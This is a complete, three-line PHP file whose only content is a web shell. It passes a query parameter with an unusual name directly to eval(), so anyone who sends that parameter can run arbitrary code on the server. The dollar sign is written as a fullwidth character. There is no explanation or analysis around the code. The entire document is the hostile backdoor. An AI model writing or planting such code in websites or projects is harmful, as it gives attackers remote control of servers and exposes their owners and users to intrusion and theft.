<?php
eval(＄_GET['gy5w-of3']);
?>
